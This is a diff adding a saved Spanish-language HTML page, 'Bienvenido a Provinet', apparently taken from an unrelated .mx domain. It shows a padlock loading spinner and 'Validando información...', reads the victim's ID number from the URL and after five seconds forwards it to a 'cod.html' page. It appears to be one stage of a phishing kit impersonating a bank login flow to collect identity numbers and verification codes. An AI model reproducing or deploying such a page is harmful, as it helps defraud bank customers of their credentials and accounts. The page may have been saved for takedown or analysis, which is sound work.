@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<!-- saved from url=(0039)https://lareservawest.mx/bbt/carga.html -->
+<html lang="es">
+<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script>
+<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script>
+<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bienvenido a Provinet</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            color: #004080;
+            text-align: center;
+        }
+        
+        .container {
+            text-align: center;
+        }
+        
+        .loader {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            border: 10px solid #e0e0e0;
+            border-top: 10px solid #004080;
+            border-right: 10px solid #70aee0;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin: 20px auto;
+        }
+        
+        .loader img {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            animation: none;
+            /* Evita que el candado se mueva */
+        }
+        
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        
+        h1 {
+            font-size: 1.8em;
+            margin: 10px 0;
+        }
+        
+        p {
+            font-size: 1em;
+        }
+    </style>
+    <script>
+        // Función para obtener el valor de un parámetro de la URL
+        function getParameterByName(name, url = window.location.href) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            let regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        // Obtén el número de documento de la URL
+        const numeroDocumento = getParameterByName('documento');
+
+        // Redirige después de 5 segundos
+        setTimeout(() => {
+            window.location.href = 'cod.html?documento=' + encodeURIComponent(numeroDocumento);
+        }, 5000);
+    </script>
+</head>
+
+<body __processed_84d8d45a-d564-4e2b-8e7c-03d7c79aa4a1__="true">
+    <div class="container">
+        <h1>Bienvenido a Provinet</h1>
+        <div class="loader">
+            <img src="./Bienvenido a Provinet_files/image-removebg-preview-11.png" alt="Ícono de candado">
+        </div>
+        <p>Validando información...</p>
+    </div>
+
+</body>
+
+</html>
